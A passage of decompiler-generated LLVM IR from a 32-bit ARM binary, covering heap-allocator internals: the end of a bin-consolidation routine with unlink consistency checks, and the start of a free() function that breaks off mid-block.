  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13418 = load i32, i32* @r4, align 4
  store i32 %v3_13418, i32* %stack_var_-36, align 4
  %v0_1341c = load i32, i32* @r0, align 4
  %v1_1341c = inttoptr i32 %v0_1341c to i32*
  %v2_1341c = load i32, i32* %v1_1341c, align 4
  store i32 %v2_1341c, i32* %r3.global-to-local, align 4
  %v2_13420 = icmp eq i32 %v2_1341c, 0
  store i32 %v0_1341c, i32* @r4, align 4
  br i1 %v2_13420, label %dec_label_pc_13558.preheader, label %dec_label_pc_13434

dec_label_pc_13558.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1356025 = add i32 %v0_1341c, 52
  store i32 %v1_1356025, i32* %r3.global-to-local, align 4
  %v2_1356826 = add i32 %v0_1341c, 60
  %v3_1356827 = inttoptr i32 %v2_1356826 to i32*
  store i32 %v1_1356025, i32* %v3_1356827, align 4
  %v0_1356c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1356c29 = add i32 %v0_1356c28, 12
  %v3_1356c30 = inttoptr i32 %v2_1356c29 to i32*
  store i32 %v0_1356c28, i32* %v3_1356c30, align 4
  br label %dec_label_pc_13558.dec_label_pc_13558_crit_edge

dec_label_pc_13434:                               ; preds = %entry
  %v1_13434 = and i32 %v2_1341c, -3
  %v3_13438 = udiv i32 %v2_1341c, 8
  store i32 %v3_13438, i32* %r2.global-to-local, align 4
  store i32 %v1_13434, i32* %v1_1341c, align 4
  %v0_13440 = load i32, i32* @r0, align 4
  %v1_13440 = add i32 %v0_13440, -4
  store i32 %v1_13440, i32* %r3.global-to-local, align 4
  %v1_13444 = load i32, i32* %r2.global-to-local, align 4
  %v4_13444 = mul i32 %v1_13444, 4
  %v5_13444 = add i32 %v4_13444, %v1_13440
  store i32 %v5_13444, i32* %sb.global-to-local, align 4
  %v1_13448 = add i32 %v0_13440, 52
  store i32 %v1_13448, i32* %r7.global-to-local, align 4
  %v1_1344c = add i32 %v0_13440, 4
  store i32 %v1_1344c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_13550, %dec_label_pc_13434
  %v1_1354810 = phi i32 [ %v1_13548, %dec_label_pc_13550 ], [ %v5_13444, %dec_label_pc_13434 ]
  %v1_13460 = phi i32 [ %v1_13550, %dec_label_pc_13550 ], [ %v1_1344c, %dec_label_pc_13434 ]
  %v1_13454 = inttoptr i32 %v1_13460 to i32*
  %v2_13454 = load i32, i32* %v1_13454, align 4
  store i32 %v2_13454, i32* %r1.global-to-local, align 4
  %v2_13458 = icmp eq i32 %v2_13454, 0
  br i1 %v2_13458, label %dec_label_pc_13548, label %dec_label_pc_13460

dec_label_pc_13460:                               ; preds = %dec_label_pc_13454
  %v0_13460 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13460, i32* %v1_13454, align 4
  %v0_13464.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %dec_label_pc_1353c, %dec_label_pc_13460
  %v0_13480 = phi i32 [ %v0_1353c, %dec_label_pc_1353c ], [ %v0_13464.pre, %dec_label_pc_13460 ]
  %v1_13464 = add i32 %v0_13480, 4
  %v2_13464 = inttoptr i32 %v1_13464 to i32*
  %v3_13464 = load i32, i32* %v2_13464, align 4
  store i32 %v3_13464, i32* %r3.global-to-local, align 4
  %v1_13468 = and i32 %v3_13464, -2
  store i32 %v1_13468, i32* %lr.global-to-local, align 4
  %v2_1346c = add i32 %v1_13468, %v0_13480
  store i32 %v2_1346c, i32* @r0, align 4
  %v1_13470 = urem i32 %v3_13464, 2
  %v2_13470 = icmp eq i32 %v1_13470, 0
  %v1_13474 = add i32 %v0_13480, 8
  %v2_13474 = inttoptr i32 %v1_13474 to i32*
  %v3_13474 = load i32, i32* %v2_13474, align 4
  store i32 %v3_13474, i32* %sl.global-to-local, align 4
  %v1_13478 = add i32 %v2_1346c, 4
  %v2_13478 = inttoptr i32 %v1_13478 to i32*
  %v3_13478 = load i32, i32* %v2_13478, align 4
  store i32 %v3_13478, i32* %r8.global-to-local, align 4
  br i1 %v2_13470, label %dec_label_pc_13480, label %dec_label_pc_134b4

dec_label_pc_13480:                               ; preds = %dec_label_pc_13464
  %v1_13480 = inttoptr i32 %v0_13480 to i32*
  %v2_13480 = load i32, i32* %v1_13480, align 4
  store i32 %v2_13480, i32* %r5.global-to-local, align 4
  %v2_13484 = sub i32 %v0_13480, %v2_13480
  store i32 %v2_13484, i32* %r3.global-to-local, align 4
  %v1_13488 = add i32 %v2_13484, 8
  %v2_13488 = inttoptr i32 %v1_13488 to i32*
  %v3_13488 = load i32, i32* %v2_13488, align 4
  store i32 %v3_13488, i32* %ip.global-to-local, align 4
  %v1_1348c = add i32 %v3_13488, 12
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  store i32 %v3_1348c, i32* %r1.global-to-local, align 4
  %v9_13490 = icmp eq i32 %v3_1348c, %v2_13484
  %v1_13494 = add i32 %v2_13484, 12
  %v2_13494 = inttoptr i32 %v1_13494 to i32*
  %v3_13494 = load i32, i32* %v2_13494, align 4
  store i32 %v3_13494, i32* %r2.global-to-local, align 4
  br i1 %v9_13490, label %dec_label_pc_1349c, label %dec_label_pc_134f8

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13480
  %v1_1349c = add i32 %v3_13494, 8
  %v2_1349c = inttoptr i32 %v1_1349c to i32*
  %v3_1349c = load i32, i32* %v2_1349c, align 4
  store i32 %v3_1349c, i32* %r3.global-to-local, align 4
  %v9_134a0 = icmp eq i32 %v3_1349c, %v2_13484
  br i1 %v9_134a0, label %dec_label_pc_134a8, label %dec_label_pc_134f8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_1349c
  store i32 %v3_13488, i32* %v2_1349c, align 4
  %v0_134ac = load i32, i32* %r2.global-to-local, align 4
  %v1_134ac = load i32, i32* %ip.global-to-local, align 4
  %v2_134ac = add i32 %v1_134ac, 12
  %v3_134ac = inttoptr i32 %v2_134ac to i32*
  store i32 %v0_134ac, i32* %v3_134ac, align 4
  %v0_134b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_134b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_134b0 = add i32 %v1_134b0, %v0_134b0
  store i32 %v2_134b0, i32* %lr.global-to-local, align 4
  %v0_134b8.pre = load i32, i32* @r0, align 4
  %v0_134bc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_134b4

dec_label_pc_134b4:                               ; preds = %dec_label_pc_13464, %dec_label_pc_134a8
  %v0_1352c = phi i32 [ %v1_13468, %dec_label_pc_13464 ], [ %v2_134b0, %dec_label_pc_134a8 ]
  %v0_134bc = phi i32 [ %v3_13478, %dec_label_pc_13464 ], [ %v0_134bc.pre, %dec_label_pc_134a8 ]
  %v1_134d0 = phi i32 [ %v2_1346c, %dec_label_pc_13464 ], [ %v0_134b8.pre, %dec_label_pc_134a8 ]
  %v0_134b4 = load i32, i32* @r4, align 4
  %v1_134b4 = add i32 %v0_134b4, 44
  %v2_134b4 = inttoptr i32 %v1_134b4 to i32*
  %v3_134b4 = load i32, i32* %v2_134b4, align 4
  store i32 %v3_134b4, i32* %r3.global-to-local, align 4
  %v9_134b8 = icmp eq i32 %v1_134d0, %v3_134b4
  %v1_134bc = and i32 %v0_134bc, -4
  store i32 %v1_134bc, i32* %r5.global-to-local, align 4
  br i1 %v9_134b8, label %dec_label_pc_1352c, label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_134b4
  %v2_134c4 = add i32 %v1_134d0, %v1_134bc
  store i32 %v2_134c4, i32* %r3.global-to-local, align 4
  %v1_134c8 = add i32 %v2_134c4, 4
  %v2_134c8 = inttoptr i32 %v1_134c8 to i32*
  %v3_134c8 = load i32, i32* %v2_134c8, align 4
  store i32 %v3_134c8, i32* %r3.global-to-local, align 4
  %v1_134cc = urem i32 %v3_134c8, 2
  %v2_134cc = icmp eq i32 %v1_134cc, 0
  %v2_134d0 = add i32 %v1_134d0, 4
  %v3_134d0 = inttoptr i32 %v2_134d0 to i32*
  store i32 %v1_134bc, i32* %v3_134d0, align 4
  br i1 %v2_134cc, label %dec_label_pc_134d8, label %dec_label_pc_134c4.dec_label_pc_13508_crit_edge

dec_label_pc_134c4.dec_label_pc_13508_crit_edge:  ; preds = %dec_label_pc_134c4
  %v0_1350c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134c4
  %v0_134d8 = load i32, i32* @r0, align 4
  %v1_134d8 = add i32 %v0_134d8, 8
  %v2_134d8 = inttoptr i32 %v1_134d8 to i32*
  %v3_134d8 = load i32, i32* %v2_134d8, align 4
  store i32 %v3_134d8, i32* %ip.global-to-local, align 4
  %v1_134dc = add i32 %v3_134d8, 12
  %v2_134dc = inttoptr i32 %v1_134dc to i32*
  %v3_134dc = load i32, i32* %v2_134dc, align 4
  store i32 %v3_134dc, i32* %r3.global-to-local, align 4
  %v9_134e0 = icmp eq i32 %v3_134dc, %v0_134d8
  %v1_134e4 = add i32 %v0_134d8, 12
  %v2_134e4 = inttoptr i32 %v1_134e4 to i32*
  %v3_134e4 = load i32, i32* %v2_134e4, align 4
  store i32 %v3_134e4, i32* %r2.global-to-local, align 4
  br i1 %v9_134e0, label %dec_label_pc_134ec, label %dec_label_pc_134f8

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134d8
  %v1_134ec = add i32 %v3_134e4, 8
  %v2_134ec = inttoptr i32 %v1_134ec to i32*
  %v3_134ec = load i32, i32* %v2_134ec, align 4
  store i32 %v3_134ec, i32* %r3.global-to-local, align 4
  %v9_134f0 = icmp eq i32 %v3_134ec, %v0_134d8
  br i1 %v9_134f0, label %dec_label_pc_134fc, label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134d8, %dec_label_pc_1349c, %dec_label_pc_13480, %dec_label_pc_134ec
  %v0_134f8 = call i32 @abort()
  store i32 %v0_134f8, i32* @r0, align 4
  %v0_134fc.pre = load i32, i32* @ip, align 4
  %v1_134fc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_134fc

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134ec, %dec_label_pc_134f8
  %v1_134fc = phi i32 [ %v3_134e4, %dec_label_pc_134ec ], [ %v1_134fc.pre, %dec_label_pc_134f8 ]
  %v0_134fc = phi i32 [ %v3_134d8, %dec_label_pc_134ec ], [ %v0_134fc.pre, %dec_label_pc_134f8 ]
  %v2_134fc = add i32 %v1_134fc, 8
  %v3_134fc = inttoptr i32 %v2_134fc to i32*
  store i32 %v0_134fc, i32* %v3_134fc, align 4
  %v0_13500 = load i32, i32* %r2.global-to-local, align 4
  %v1_13500 = load i32, i32* %ip.global-to-local, align 4
  %v2_13500 = add i32 %v1_13500, 12
  %v3_13500 = inttoptr i32 %v2_13500 to i32*
  store i32 %v0_13500, i32* %v3_13500, align 4
  %v0_13504 = load i32, i32* %lr.global-to-local, align 4
  %v1_13504 = load i32, i32* %r5.global-to-local, align 4
  %v2_13504 = add i32 %v1_13504, %v0_13504
  store i32 %v2_13504, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_134c4.dec_label_pc_13508_crit_edge, %dec_label_pc_134fc
  %v0_1350c = phi i32 [ %v0_1350c.pre, %dec_label_pc_134c4.dec_label_pc_13508_crit_edge ], [ %v2_13504, %dec_label_pc_134fc ]
  %v0_13508 = load i32, i32* %r7.global-to-local, align 4
  %v1_13508 = add i32 %v0_13508, 8
  %v2_13508 = inttoptr i32 %v1_13508 to i32*
  %v3_13508 = load i32, i32* %v2_13508, align 4
  store i32 %v3_13508, i32* %r2.global-to-local, align 4
  %v1_1350c = or i32 %v0_1350c, 1
  store i32 %v1_1350c, i32* %r3.global-to-local, align 4
  %v0_13510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13510, i32* %v2_13508, align 4
  %v0_13514 = load i32, i32* %r1.global-to-local, align 4
  %v1_13514 = load i32, i32* %r2.global-to-local, align 4
  %v2_13514 = add i32 %v1_13514, 12
  %v3_13514 = inttoptr i32 %v2_13514 to i32*
  store i32 %v0_13514, i32* %v3_13514, align 4
  %v0_13518 = load i32, i32* %lr.global-to-local, align 4
  %v1_13518 = load i32, i32* %r1.global-to-local, align 4
  %v3_13518 = add i32 %v1_13518, %v0_13518
  %v4_13518 = inttoptr i32 %v3_13518 to i32*
  store i32 %v0_13518, i32* %v4_13518, align 4
  %v0_1351c = load i32, i32* %r3.global-to-local, align 4
  %v1_1351c = load i32, i32* %r1.global-to-local, align 4
  %v2_1351c = add i32 %v1_1351c, 4
  %v3_1351c = inttoptr i32 %v2_1351c to i32*
  store i32 %v0_1351c, i32* %v3_1351c, align 4
  %v0_13520 = load i32, i32* %r2.global-to-local, align 4
  %v1_13520 = load i32, i32* %r1.global-to-local, align 4
  %v2_13520 = add i32 %v1_13520, 8
  %v3_13520 = inttoptr i32 %v2_13520 to i32*
  store i32 %v0_13520, i32* %v3_13520, align 4
  %v0_13524 = load i32, i32* %r7.global-to-local, align 4
  %v1_13524 = load i32, i32* %r1.global-to-local, align 4
  %v2_13524 = add i32 %v1_13524, 12
  %v3_13524 = inttoptr i32 %v2_13524 to i32*
  store i32 %v0_13524, i32* %v3_13524, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_134b4
  %v2_1352c = add i32 %v1_134bc, %v0_1352c
  %v1_13530 = or i32 %v2_1352c, 1
  store i32 %v1_13530, i32* %r3.global-to-local, align 4
  %v1_13534 = load i32, i32* %r1.global-to-local, align 4
  %v2_13534 = add i32 %v1_13534, 4
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  store i32 %v1_13530, i32* %v3_13534, align 4
  %v0_13538 = load i32, i32* %r1.global-to-local, align 4
  %v1_13538 = load i32, i32* @r4, align 4
  %v2_13538 = add i32 %v1_13538, 44
  %v3_13538 = inttoptr i32 %v2_13538 to i32*
  store i32 %v0_13538, i32* %v3_13538, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13508, %dec_label_pc_1352c
  %v0_1353c = load i32, i32* %sl.global-to-local, align 4
  %v2_1353c = icmp eq i32 %v0_1353c, 0
  store i32 %v0_1353c, i32* %r1.global-to-local, align 4
  br i1 %v2_1353c, label %dec_label_pc_13548.loopexit, label %dec_label_pc_13464

dec_label_pc_13548.loopexit:                      ; preds = %dec_label_pc_1353c
  %v0_13548.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13548.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13548

dec_label_pc_13548:                               ; preds = %dec_label_pc_13548.loopexit, %dec_label_pc_13454
  %v1_13548 = phi i32 [ %v1_13548.pre, %dec_label_pc_13548.loopexit ], [ %v1_1354810, %dec_label_pc_13454 ]
  %v0_13550 = phi i32 [ %v0_13548.pre, %dec_label_pc_13548.loopexit ], [ %v1_13460, %dec_label_pc_13454 ]
  %v9_13548 = icmp eq i32 %v0_13550, %v1_13548
  br i1 %v9_13548, label %dec_label_pc_135c0, label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %dec_label_pc_13548
  %v1_13550 = add i32 %v0_13550, 4
  store i32 %v1_13550, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13454

dec_label_pc_13558.dec_label_pc_13558_crit_edge:  ; preds = %dec_label_pc_13558.preheader, %dec_label_pc_13558.dec_label_pc_13558_crit_edge
  %v0_13558.pre = load i32, i32* @r4, align 4
  %v1_13558.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13558 = mul i32 %v1_13558.pre, 8
  %v5_13558 = add i32 %v4_13558, %v0_13558.pre
  %v1_1355c = add i32 %v1_13558.pre, 1
  store i32 %v1_1355c, i32* %r2.global-to-local, align 4
  %v1_13560 = add i32 %v5_13558, 44
  store i32 %v1_13560, i32* %r3.global-to-local, align 4
  %v2_13568 = add i32 %v5_13558, 52
  %v3_13568 = inttoptr i32 %v2_13568 to i32*
  store i32 %v1_13560, i32* %v3_13568, align 4
  %v0_1356c = load i32, i32* %r3.global-to-local, align 4
  %v2_1356c = add i32 %v0_1356c, 12
  %v3_1356c = inttoptr i32 %v2_1356c to i32*
  store i32 %v0_1356c, i32* %v3_1356c, align 4
  %v7_13570 = icmp sgt i32 %v1_1355c, 95
  br i1 %v7_13570, label %dec_label_pc_13574, label %dec_label_pc_13558.dec_label_pc_13558_crit_edge

dec_label_pc_13574:                               ; preds = %dec_label_pc_13558.dec_label_pc_13558_crit_edge
  %v0_13574 = load i32, i32* @r4, align 4
  %v1_13574 = inttoptr i32 %v0_13574 to i32*
  %v2_13574 = load i32, i32* %v1_13574, align 4
  store i32 %v2_13574, i32* %r2.global-to-local, align 4
  %v1_13578 = add i32 %v0_13574, 864
  %v2_13578 = inttoptr i32 %v1_13578 to i32*
  %v3_13578 = load i32, i32* %v2_13578, align 4
  %v1_13580 = urem i32 %v2_13574, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13588 = or i32 %v3_13578, 1
  store i32 %v1_13588, i32* %r1.global-to-local, align 4
  %v1_1358c = or i32 %v1_13580, 72
  store i32 %v1_1358c, i32* %r2.global-to-local, align 4
  %v1_13590 = add i32 %v0_13574, 52
  store i32 %v1_13590, i32* %ip.global-to-local, align 4
  %v2_13594 = add i32 %v0_13574, 840
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  store i32 0, i32* %v3_13594, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v0_1359c = load i32, i32* %r0.global-to-local, align 4
  %v1_1359c = load i32, i32* @r4, align 4
  %v2_1359c = add i32 %v1_1359c, 836
  %v3_1359c = inttoptr i32 %v2_1359c to i32*
  store i32 %v0_1359c, i32* %v3_1359c, align 4
  %v0_135a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_135a0 = load i32, i32* @r4, align 4
  %v2_135a0 = add i32 %v1_135a0, 844
  %v3_135a0 = inttoptr i32 %v2_135a0 to i32*
  store i32 %v0_135a0, i32* %v3_135a0, align 4
  %v1_135a4 = load i32, i32* @r4, align 4
  %v2_135a4 = add i32 %v1_135a4, 852
  %v3_135a4 = inttoptr i32 %v2_135a4 to i32*
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %v3_135a4, align 4
  %v1_135a8 = load i32, i32* @r4, align 4
  %v2_135a8 = add i32 %v1_135a8, 864
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  store i32 %v1_13588, i32* %v3_135a8, align 4
  %v1_135ac = load i32, i32* @r4, align 4
  %v2_135ac = inttoptr i32 %v1_135ac to i32*
  store i32 %v1_1358c, i32* %v2_135ac, align 4
  %v0_135b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_135b0 = load i32, i32* @r4, align 4
  %v2_135b0 = add i32 %v1_135b0, 44
  %v3_135b0 = inttoptr i32 %v2_135b0 to i32*
  store i32 %v0_135b0, i32* %v3_135b0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_135b8 = call i32 @sysconf(i32 30, i32 %v1_13588, i32 %v1_1358c, i32 ptrtoint (i32* @global_var_10000.57 to i32))
  store i32 %v4_135b8, i32* @r0, align 4
  %v1_135bc = load i32, i32* @r4, align 4
  %v2_135bc = add i32 %v1_135bc, 860
  %v3_135bc = inttoptr i32 %v2_135bc to i32*
  store i32 %v4_135b8, i32* %v3_135bc, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13548, %dec_label_pc_13574
  %v2_135c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_135c4, i32* @r4, align 4
  %v1_135c8 = load i32, i32* @r0, align 4
  ret i32 %v1_135c8

; uselistorder directives
  uselistorder i32 %v0_13574, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1356c, { 1, 0 }
  uselistorder i32 %v1_13550, { 1, 0 }
  uselistorder i32 %v0_1353c, { 0, 2, 1 }
  uselistorder i32 %v0_13518, { 1, 0 }
  uselistorder i32 %v1_13468, { 1, 0, 2 }
  uselistorder i32 %v0_13480, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13440, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 12, 6, 5, 2, 3, 4, 0, 10, 11, 8, 9, 7 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
  uselistorder label %dec_label_pc_13558.dec_label_pc_13558_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13508, { 1, 0 }
  uselistorder label %dec_label_pc_134fc, { 1, 0 }
  uselistorder label %dec_label_pc_134f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_134b4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_135cc = load i32, i32* @r4, align 4
  %v6_135cc = load i32, i32* @r5, align 4
  %v9_135cc = load i32, i32* @r6, align 4
  %v12_135cc = load i32, i32* @r7, align 4
  %v18_135cc = load i32, i32* @lr, align 4
  %v0_135d4 = load i32, i32* @r0, align 4
  store i32 %v0_135d4, i32* @r6, align 4
  %v2_135d4 = icmp eq i32 %v0_135d4, 0
  %v2_135d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r7, align 4
  br i1 %v2_135d4, label %dec_label_pc_137e0, label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_135e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 108) to i32*), align 4
  store i32 %v4_135e8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_135e8, i32* %r2.global-to-local, align 4
  %v4_135f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), align 4
  store i32 %v4_135f4, i32* %r1.global-to-local, align 4
  store i32 %v2_135d8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13600 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  store i32 %v4_13600, i32* %ip.global-to-local, align 4
  store i32 79372, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13600)
  %v0_1360c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1360c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13614 = load i32, i32* @r7, align 4
  %v2_13614 = add i32 %v0_13614, 16
  %v3_13614 = inttoptr i32 %v2_13614 to i32*
  %v4_13614 = load i32, i32* %v3_13614, align 4
  store i32 %v4_13614, i32* %ip.global-to-local, align 4
  store i32 79392, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13614)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13624 = load i32, i32* @r7, align 4
  %v2_13624 = add i32 %v0_13624, 64
  %v3_13624 = inttoptr i32 %v2_13624 to i32*
  %v4_13624 = load i32, i32* %v3_13624, align 4
  store i32 %v4_13624, i32* @lr, align 4
  %v0_13628 = load i32, i32* @r6, align 4
  %v1_13628 = add i32 %v0_13628, -4
  %v2_13628 = inttoptr i32 %v1_13628 to i32*
  %v3_13628 = load i32, i32* %v2_13628, align 4
  store i32 %v3_13628, i32* %r2.global-to-local, align 4
  %v1_1362c = inttoptr i32 %v4_13624 to i32*
  %v2_1362c = load i32, i32* %v1_1362c, align 4
  store i32 %v2_1362c, i32* %r3.global-to-local, align 4
  %v1_13630 = and i32 %v3_13628, -4
  store i32 %v1_13630, i32* %ip.global-to-local, align 4
  %v1_13634 = add i32 %v0_13628, -8
  store i32 %v1_13634, i32* @r5, align 4
  store i32 %v1_13634, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13630, %v2_1362c
  br i1 %tmp, label %dec_label_pc_13664, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_135e4
  %v1_13644 = or i32 %v2_1362c, 3
  store i32 %v1_13644, i32* %r3.global-to-local, align 4
  store i32 %v1_13644, i32* %v1_1362c, align 4
  %v3_13648 = load i32, i32* @lr, align 4
  %v4_13648 = add i32 %v3_13648, -8
  store i32 %v4_13648, i32* %lr.global-to-local, align 4
  %v0_1364c = load i32, i32* %ip.global-to-local, align 4
  %v3_1364c = udiv i32 %v0_1364c, 8
  store i32 %v3_1364c, i32* %r1.global-to-local, align 4
  %v1_13650 = add i32 %v3_13648, -4
  store i32 %v1_13650, i32* %r2.global-to-local, align 4
  %v4_13654 = mul nuw i32 %v3_1364c, 4
  %v5_13654 = add i32 %v4_13654, %v1_13650
  %v6_13654 = inttoptr i32 %v5_13654 to i32*
  %v7_13654 = load i32, i32* %v6_13654, align 4
  store i32 %v7_13654, i32* %r3.global-to-local, align 4
  %v1_13658 = load i32, i32* @r5, align 4
  %v2_13658 = add i32 %v1_13658, 8
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v7_13654, i32* %v3_13658, align 4
  %v0_1365c = load i32, i32* @r5, align 4
  %v1_1365c = load i32, i32* %r2.global-to-local, align 4
  %v2_1365c = load i32, i32* %r1.global-to-local, align 4
  %v5_1365c = mul i32 %v2_1365c, 4
  %v6_1365c = add i32 %v5_1365c, %v1_1365c
  %v7_1365c = inttoptr i32 %v6_1365c to i32*
  store i32 %v0_1365c, i32* %v7_1365c, align 4
  br label %dec_label_pc_137c8

dec_label_pc_13664:                               ; preds = %dec_label_pc_135e4
  %v1_13664 = and i32 %v3_13628, 2
  %v2_13664 = icmp eq i32 %v1_13664, 0
  br i1 %v2_13664, label %dec_label_pc_1366c, label %dec_label_pc_137a0

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13664
  %v1_1366c = or i32 %v2_1362c, 1
  store i32 %v1_1366c, i32* %r3.global-to-local, align 4
  store i32 %v1_1366c, i32* %v1_1362c, align 4
  %v0_13674 = load i32, i32* @r6, align 4
  %v1_13674 = add i32 %v0_13674, -4
  %v2_13674 = inttoptr i32 %v1_13674 to i32*
  %v3_13674 = load i32, i32* %v2_13674, align 4
  store i32 %v3_13674, i32* %r3.global-to-local, align 4
  %v0_13678 = load i32, i32* @r5, align 4
  %v1_13678 = load i32, i32* %ip.global-to-local, align 4
  %v2_13678 = add i32 %v1_13678, %v0_13678
  store i32 %v2_13678, i32* %lr.global-to-local, align 4
  %v1_1367c = urem i32 %v3_13674, 2
  %v2_1367c = icmp eq i32 %v1_1367c, 0
  %v1_13680 = add i32 %v2_13678, 4
  %v2_13680 = inttoptr i32 %v1_13680 to i32*
  %v3_13680 = load i32, i32* %v2_13680, align 4
  store i32 %v3_13680, i32* %r8.global-to-local, align 4
  br i1 %v2_1367c, label %dec_label_pc_13688, label %dec_label_pc_136bc

dec_label_pc_13688:                               ; preds = %dec_label_pc_1366c
  %v1_13688 = add i32 %v0_13674, -8
  %v2_13688 = inttoptr i32 %v1_13688 to i32*
  %v3_13688 = load i32, i32* %v2_13688, align 4
  store i32 %v3_13688, i32* %r1.global-to-local, align 4
  %v2_1368c = sub i32 %v0_13678, %v3_13688
  store i32 %v2_1368c, i32* %r3.global-to-local, align 4
  %v1_13690 = add i32 %v2_1368c, 8
  %v2_13690 = inttoptr i32 %v1_13690 to i32*
  %v3_13690 = load i32, i32* %v2_13690, align 4
  store i32 %v3_13690, i32* %r2.global-to-local, align 4
  %v1_13694 = add i32 %v3_13690, 12
  %v2_13694 = inttoptr i32 %v1_13694 to i32*
  %v3_13694 = load i32, i32* %v2_13694, align 4
  store i32 %v3_13694, i32* %r4.global-to-local, align 4
  %v9_13698 = icmp eq i32 %v3_13694, %v2_1368c
  %v1_1369c = add i32 %v2_1368c, 12
  %v2_1369c = inttoptr i32 %v1_1369c to i32*
  %v3_1369c = load i32, i32* %v2_1369c, align 4
  store i32 %v3_1369c, i32* %r0.global-to-local, align 4
  br i1 %v9_13698, label %dec_label_pc_136a4, label %dec_label_pc_13708

dec_label_pc_136a4:                               ; preds = %dec_label_pc_13688
  %v1_136a4 = add i32 %v3_1369c, 8
  %v2_136a4 = inttoptr i32 %v1_136a4 to i32*
